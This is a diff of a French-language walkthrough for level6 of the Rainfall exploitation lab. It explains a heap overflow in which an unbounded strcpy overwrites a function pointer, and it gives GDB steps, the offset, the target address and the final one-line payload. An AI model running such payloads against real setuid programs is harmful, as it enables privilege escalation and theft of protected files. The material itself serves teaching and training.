@@ -3,42 +3,101 @@
 ## 1. Objective
 Afficher le mot de passe level7. Le binaire est setuid level7 ; `n()` exécute `system("/bin/cat /home/user/level7/.pass")` mais n’est pas appelée. Par défaut un pointeur de fonction pointe vers `m()` ("Nope").
 
-## 2. Initial diagnosis (before GDB)
-- **Fonctions suspectes :** `strcpy(buffer, argv[1])` sans limite dans main ; buffer = malloc(64), puis malloc(4) pour un pointeur de fonction ; *ptr = m ; **call *ptr**. Overflow possible depuis le buffer vers le bloc suivant (pointeur).
-- **Entrée utilisateur :** argv[1] copié intégralement dans le buffer par strcpy.
-- **Succès :** faire en sorte que call *ptr invoque n() au lieu de m() → affichage du mot de passe. Donc écraser le pointeur par l’adresse de n (0x08048454).
-- **Hypothèse :** buffer overflow sur le heap ; le pointeur est juste après le buffer (avec en-têtes de chunk). Sur Rainfall l’offset observé est **72** (64 + 8).
+## 2. Copy the binary (extraction)
+Depuis l’hôte :
+```bash
+sshpass -p '<level6_password>' scp -o StrictHostKeyChecking=no -P 4242 level6@localhost:level6 ./level6.bin
+```
+Référence : `commands.md`, Recon / Extraction.
 
-## 3. GDB diagnosis (how the vulnerability was found)
-- **Où break :** dans main, juste avant `call *ptr` (ou avant l’instruction qui charge le pointeur). But : voir la valeur du pointeur avant/après overflow et confirmer l’offset.
-- **Layout heap :** main fait malloc(0x40) puis malloc(4). Le buffer fait 64 octets ; le bloc de 4 contient le pointeur. Selon l’allocateur, il peut y avoir des en-têtes entre les deux. `x/20wx` sur les adresses retournées par malloc pour voir buffer puis pointeur. Sur Rainfall : **72 octets** (64 + 8) pour atteindre les 4 octets du pointeur.
-- **Offset :** envoyer 72 octets + 4 octets (ex. adresse de n). Break avant call *ptr ; le registre (ex. eax) doit contenir 0x08048454. Si le programme appelle n() et affiche le mot de passe, l’offset 72 est correct. Sinon tester 64 ou 68.
-- **Adresses :** `info functions` ou désassemblage : n @ **0x08048454**, m @ 0x08048468.
-- **Contrôle du flux :** call *ptr lit la valeur du pointeur ; après overflow avec 72 + \x54\x84\x04\x08, cette valeur est 0x08048454 → exécution de n() → system("/bin/cat ...").
+## 3. Binary-to-source translation (source reconstruction)
+- **Objdump -d main :** main fait deux `malloc` : le premier 0x40 (64 octets) pour un buffer, le second 4 octets pour un pointeur. Le pointeur est initialisé avec l’adresse de **m**. Puis **strcpy(buffer, argv[1])** sans limite, puis **call *ptr** (indirection du pointeur).
+- **Où ça peut casser :** strcpy copie argv[1] sans borne. Le bloc de 4 octets (pointeur) est après le buffer sur le heap. En dépassant 64 octets (plus possible en-tête de chunk), on écrase ce pointeur. Si on y met l’adresse de **n**, call *ptr exécutera n() → affichage du mot de passe.
+- Source : voir `source.c` / `source.md`.
 
-## 4. Building the exploit command
-- **Cible :** le pointeur de fonction (4 octets après 72 octets de padding) ; valeur : adresse de n = 0x08048454.
-- **Structure :** [72 octets padding] + [4 octets = 0x08048454 LE]. Pas de shellcode ; uniquement padding + adresse.
-- **Encodage :** `\x54\x84\x04\x08`. Python : `print "A"*72 + "\x54\x84\x04\x08"`. Pas de \n dans argv[1] (strcpy s’arrête au NUL, donc pas de problème).
-- **Invocation :** le programme prend argv[1] ; pas de stdin à garder. `./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')`.
-- **Référence commands.md :** section Exploitation. La valeur 72 et l’adresse de n viennent du diagnostic GDB (layout heap).
+## 4. Understanding where it can break (vulnerability hypothesis)
+- **Fonctions suspectes :** strcpy(buffer, argv[1]) sans limite ; buffer 64 octets.
+- **Succès :** que call *ptr invoque n() au lieu de m(). Donc écraser le pointeur par l’adresse de n (0x08048454).
+- **Hypothèse :** buffer overflow sur le heap ; l’offset exact dépend du layout (64 + en-tête). Sur Rainfall : **72** octets avant les 4 octets du pointeur.
 
-## 5. Exploitation logic
-Buffer overflow sur le heap via strcpy(buffer, argv[1]). Le pointeur de fonction est stocké juste après le buffer ; en l’écrasant avec l’adresse de n(), call *ptr invoque n() → /bin/cat affiche le mot de passe.
+## 5. GDB diagnosis step-by-step
 
-## 6. Reproducible procedure (for evaluation)
+1. **Lancer GDB**  
+   ```bash
+   gdb -q ./level6.bin
+   ```
+
+2. **Repérer main et l’appel indirect**  
+   ```gdb
+   disas main
+   ```  
+   Noter : malloc(0x40), malloc(4), strcpy, puis l’instruction qui charge le pointeur et fait **call** (ex. call *%eax). Mettre un breakpoint juste avant ce call.
+
+3. **Breakpoint avant call *ptr**  
+   ```gdb
+   break *<adresse_avant_call_indirect>
+   run $(python -c 'print "A"*72 + "BBBB"')
+   ```  
+   But : voir la valeur du registre (ex. eax) qui va être utilisée pour le call. Si l’overflow est correct, avant l’overflow eax = adresse de m ; avec 72 + "BBBB" on veut voir si on contrôle déjà (ex. 0x42424242) ou si il faut 72 (sur Rainfall 72 donne l’adresse de n si on met les bons octets).
+
+4. **Mesurer l’offset**  
+   Essayer 64, 68, 72. Avec 72 + "\x54\x84\x04\x08" (adresse de n en LE), au breakpoint :  
+   ```gdb
+   p/x $eax
+   ```  
+   Doit afficher 0x08048454. Si oui, offset **72** confirmé. Sinon ajuster (64 ou 68 selon le layout heap).
+
+5. **Adresses**  
+   ```gdb
+   info functions n
+   info functions m
+   ```  
+   **n = 0x08048454**, m = 0x08048468. Pour l’exploit on n’a besoin que de l’adresse de n en little-endian.
+
+6. **Vérification**  
+   `run $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')`. Après le call, le programme doit exécuter n() et afficher le mot de passe (si on est sur la VM avec le fichier .pass). Cela prouve le détournement du pointeur de fonction.
+
+## 6. Exploit design and command explanation
+
+**Génération de la commande (converter.py) :**  
+`level6/converter.py` prend l’offset (72 sur RainFall) et l’adresse de **n** (0x08048454) et affiche la commande finale. Entrées : valeurs trouvées en GDB (section 5).
+
+**Conception :** Overflow heap via strcpy ; la cible n’est pas la stack mais le **pointeur de fonction** stocké juste après le buffer. En l’écrasant avec l’adresse de n(), l’instruction `call *ptr` invoque n() → system("/bin/cat .../.pass").
+
+**Commande finale (`commands.md`, Exploitation) :**
+```bash
+./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+```
+
+**Décomposition :**
+
+- **Invocation :** le programme lit argv[1] uniquement ; pas besoin de garder stdin ouvert. On passe le payload en argument.
+
+- **Partie 1 — 72 octets 'A' (padding)**  
+  - Remplissent le buffer de 64 octets et dépassent jusqu’au pointeur (offset 72 trouvé en GDB : 64 + 8 octets d’en-tête/alignement sur Rainfall).  
+  - Ces octets écrasent tout jusqu’à (mais pas inclus) les 4 octets du pointeur.
+
+- **Partie 2 — 4 octets : adresse de n (nouvelle valeur du pointeur)**  
+  - Adresse : **0x08048454**.  
+  - Little-endian : octet de poids faible en premier → 54, 84, 04, 08.  
+  - En Python : `\x54\x84\x04\x08`.  
+  - Rôle : ces 4 octets écrasent le pointeur de fonction. Au `call *ptr`, le CPU lit 0x08048454 et saute à n().
+
+Résumé : **72 × 'A'** = offset jusqu’au pointeur ; **\x54\x84\x04\x08** = adresse de n en LE → le pointeur pointe vers n(), le mot de passe s’affiche.
+
+## 7. Reproducible procedure (for evaluation)
 - **Commande :** `./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')`. Le mot de passe level7 s’affiche.
-- **Résultat attendu :** sortie = mot de passe level7.
+- **Résultat attendu :** sortie = contenu de /home/user/level7/.pass.
 - **À dire :** « strcpy sans limite ; le pointeur de fonction est à 72 octets (buffer 64 + en-tête). J’écrase ce pointeur avec l’adresse de n pour que call *ptr exécute n() et affiche le mot de passe. »
 
-## 7. Oral defense points
+## 8. Oral defense points
 - **Bug :** strcpy(buffer, argv[1]) sans contrôle de longueur ; buffer 64 octets (main).
-- **GDB :** confirme que le pointeur est à l’offset 72 et que sa valeur devient 0x08048454 après overflow.
-- **Payload :** 72 octets + adresse de n ; pas de shellcode.
+- **GDB :** confirme l’offset 72 et que le registre du call vaut 0x08048454 après overflow.
+- **Payload :** 72 octets + adresse de n en LE ; pas de shellcode.
 - **Fix :** strncpy avec limite ou vérifier la longueur de argv[1].
 
-## 8. Common evaluator questions
-- **Pourquoi 72 et pas 64 ?** En-têtes de blocs malloc ou alignement ; sur la VM Rainfall 72 est l’offset observé en GDB.
-- **Où est le pointeur ?** Dans le second bloc malloc(4), juste après le buffer de 64 octets sur le heap.
+## 9. Common evaluator questions
+- **Pourquoi 72 et pas 64 ?** En-têtes de blocs malloc ou alignement ; 72 observé en GDB sur Rainfall.
+- **Où est le pointeur ?** Dans le second bloc malloc(4), juste après le buffer sur le heap.
+- **Little-endian de 0x08048454 ?** 54 84 04 08 → \x54\x84\x04\x08.
 - **Stack ou heap ?** Heap : buffer et pointeur sont alloués par malloc.
-- **Pourquoi n() ?** n() exécute /bin/cat .../.pass ; m() affiche seulement "Nope".
